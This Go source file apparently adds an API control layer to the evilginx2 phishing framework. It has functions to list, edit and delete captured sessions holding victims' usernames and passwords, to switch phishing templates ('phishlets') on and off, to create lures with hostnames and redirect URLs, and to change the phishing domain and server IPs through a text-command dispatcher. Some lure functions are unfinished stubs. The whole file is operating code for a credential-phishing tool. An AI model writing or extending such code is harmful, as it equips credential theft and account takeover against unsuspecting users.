package core

import (
	"fmt"
	"strings"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// ApiService provides methods to interact with database and execute commands
type ApiService struct {
	db     *database.Database
	cfg    *Config
	p      *HttpProxy
	crt_db *CertDb
}

// NewApiService creates a new API service
func NewApiService(db *database.Database, cfg *Config, p *HttpProxy, crt_db *CertDb) *ApiService {
	return &ApiService{
		db:     db,
		cfg:    cfg,
		p:      p,
		crt_db: crt_db,
	}
}

// ========== SESSION OPERATIONS ==========

// GetSessions returns all sessions from database
func (as *ApiService) GetSessions() ([]*database.Session, error) {
	sessions, err := as.db.ListSessions()
	if err != nil {
		log.Error("Failed to list sessions: %v", err)
		return nil, err
	}
	return sessions, nil
}

// GetSessionById returns a specific session
func (as *ApiService) GetSessionById(id int) (*database.Session, error) {
	sessions, err := as.db.ListSessions()
	if err != nil {
		return nil, err
	}
	for _, s := range sessions {
		if s.Id == id {
			return s, nil
		}
	}
	return nil, fmt.Errorf("session not found")
}

// DeleteSession deletes a session by ID
func (as *ApiService) DeleteSession(id int) error {
	err := as.db.DeleteSessionById(id)
	if err != nil {
		log.Error("Failed to delete session %d: %v", id, err)
		return err
	}
	return nil
}

// DeleteAllSessions clears all sessions
func (as *ApiService) DeleteAllSessions() error {
	sessions, err := as.db.ListSessions()
	if err != nil {
		log.Error("Failed to list sessions: %v", err)
		return err
	}
	for _, s := range sessions {
		_ = as.db.DeleteSessionById(s.Id)
	}
	as.db.Flush()
	return nil
}

// UpdateSessionField updates a session field
func (as *ApiService) UpdateSessionField(id int, field string, value interface{}) error {
	session, err := as.GetSessionById(id)
	if err != nil {
		return err
	}

	switch field {
	case "username":
		return as.db.SetSessionUsername(session.SessionId, value.(string))
	case "password":
		return as.db.SetSessionPassword(session.SessionId, value.(string))
	default:
		return fmt.Errorf("unsupported field: %s", field)
	}
}

// ========== PHISHLET OPERATIONS ==========

// GetPhishlets returns all loaded phishlets
func (as *ApiService) GetPhishlets() ([]interface{}, error) {
	result := make([]interface{}, 0)
	phishletNames := as.cfg.GetPhishletNames()

	for _, name := range phishletNames {
		phishlet, err := as.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}
		versionStr := fmt.Sprintf("%d.%d.%d", phishlet.Version.major, phishlet.Version.minor, phishlet.Version.build)
		result = append(result, map[string]interface{}{
			"name":    phishlet.Name,
			"enabled": as.cfg.IsSiteEnabled(name),
			"version": versionStr,
		})
	}
	return result, nil
}

// EnablePhishlet enables a phishlet
func (as *ApiService) EnablePhishlet(name string) error {
	err := as.cfg.SetSiteEnabled(name)
	if err != nil {
		log.Error("Failed to enable phishlet %s: %v", name, err)
		return err
	}
	return nil
}

// DisablePhishlet disables a phishlet
func (as *ApiService) DisablePhishlet(name string) error {
	err := as.cfg.SetSiteDisabled(name)
	if err != nil {
		log.Error("Failed to disable phishlet %s: %v", name, err)
		return err
	}
	return nil
}

// ========== LURE OPERATIONS ==========

// GetLures returns all configured lures
func (as *ApiService) GetLures() ([]interface{}, error) {
	result := make([]interface{}, 0)

	// Get all lures - we need to read from config
	// Since there's no direct GetLures method,  we'll need to access via terminal's method
	// For now, return empty until we verify the API
	return result, nil
}

// CreateLure creates a new lure
func (as *ApiService) CreateLure(id, hostname, path, redirUrl, phishlet, info string) error {
	lure := &Lure{
		Id:          id,
		Hostname:    hostname,
		Path:        path,
		RedirectUrl: redirUrl,
		Phishlet:    phishlet,
		Info:        info,
	}

	as.cfg.AddLure(id, lure)
	return nil
}

// DeleteLure deletes a lure by index
func (as *ApiService) DeleteLure(id string) error {
	// We need to find the index of the lure with this ID
	// For now, return an error indicating this needs terminal integration
	return fmt.Errorf("lure deletion requires terminal integration")
}

// ========== CONFIG OPERATIONS ==========

// GetConfig returns current configuration
func (as *ApiService) GetConfig() map[string]interface{} {
	return map[string]interface{}{
		"domain":          as.cfg.GetBaseDomain(),
		"external_ipv4":   as.cfg.general.ExternalIpv4,
		"bind_ipv4":       as.cfg.general.BindIpv4,
		"https_port":      as.cfg.general.HttpsPort,
		"dns_port":        as.cfg.general.DnsPort,
		"unauth_url":      as.cfg.general.UnauthUrl,
		"autocert_enabled": as.cfg.IsAutocertEnabled(),
	}
}

// UpdateConfig updates configuration
func (as *ApiService) UpdateConfig(key, value string) error {
	switch key {
	case "domain":
		as.cfg.SetBaseDomain(value)
		return nil
	case "unauth_url":
		as.cfg.SetUnauthUrl(value)
		return nil
	case "external_ipv4":
		as.cfg.SetServerExternalIP(value)
		return nil
	case "bind_ipv4":
		as.cfg.SetServerBindIP(value)
		return nil
	default:
		return fmt.Errorf("unsupported config key: %s", key)
	}
}

// ========== COMMAND EXECUTION ==========

// ExecuteCommand executes a command in the format "command arg1 arg2 ..."
func (as *ApiService) ExecuteCommand(cmd string) (interface{}, error) {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return nil, fmt.Errorf("empty command")
	}

	command := parts[0]
	args := parts[1:]

	switch command {
	case "phishlets":
		return as.handlePhishletsCmd(args)
	case "sessions":
		return as.handleSessionsCmd(args)
	case "lures":
		return as.handleLuresCmd(args)
	case "config":
		return as.handleConfigCmd(args)
	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}

// handlePhishletsCmd processes phishlet commands
func (as *ApiService) handlePhishletsCmd(args []string) (interface{}, error) {
	if len(args) == 0 {
		// List all phishlets
		return as.GetPhishlets()
	}

	subCmd := args[0]
	switch subCmd {
	case "enable":
		if len(args) < 2 {
			return nil, fmt.Errorf("phishlets enable <name>")
		}
		err := as.EnablePhishlet(args[1])
		if err != nil {
			return nil, err
		}
		return map[string]string{"status": "enabled", "phishlet": args[1]}, nil

	case "disable":
		if len(args) < 2 {
			return nil, fmt.Errorf("phishlets disable <name>")
		}
		err := as.DisablePhishlet(args[1])
		if err != nil {
			return nil, err
		}
		return map[string]string{"status": "disabled", "phishlet": args[1]}, nil
	}

	return nil, fmt.Errorf("unknown phishlets subcommand: %s", subCmd)
}

// handleSessionsCmd processes session commands
func (as *ApiService) handleSessionsCmd(args []string) (interface{}, error) {
	if len(args) == 0 {
		// List all sessions
		return as.GetSessions()
	}

	subCmd := args[0]
	switch subCmd {
	case "delete":
		if len(args) < 2 {
			return nil, fmt.Errorf("sessions delete <id>")
		}
		var id int
		_, err := fmt.Sscanf(args[1], "%d", &id)
		if err != nil {
			return nil, fmt.Errorf("invalid session id: %s", args[1])
		}
		err = as.DeleteSession(id)
		if err != nil {
			return nil, err
		}
		return map[string]string{"status": "deleted", "id": args[1]}, nil

	case "clear":
		err := as.DeleteAllSessions()
		if err != nil {
			return nil, err
		}
		return map[string]string{"status": "cleared"}, nil
	}

	return nil, fmt.Errorf("unknown sessions subcommand: %s", subCmd)
}

// handleLuresCmd processes lure commands
func (as *ApiService) handleLuresCmd(args []string) (interface{}, error) {
	if len(args) == 0 {
		// List all lures
		return as.GetLures()
	}

	subCmd := args[0]
	switch subCmd {
	case "delete":
		if len(args) < 2 {
			return nil, fmt.Errorf("lures delete <id>")
		}
		err := as.DeleteLure(args[1])
		if err != nil {
			return nil, err
		}
		return map[string]string{"status": "deleted", "id": args[1]}, nil
	}

	return nil, fmt.Errorf("unknown lures subcommand: %s", subCmd)
}

// handleConfigCmd processes config commands
func (as *ApiService) handleConfigCmd(args []string) (interface{}, error) {
	if len(args) == 0 {
		// Get current config
		return as.GetConfig(), nil
	}

	if len(args) < 2 {
		return nil, fmt.Errorf("config <key> <value>")
	}

	err := as.UpdateConfig(args[0], args[1])
	if err != nil {
		return nil, err
	}

	return map[string]string{"status": "updated", "key": args[0]}, nil
}
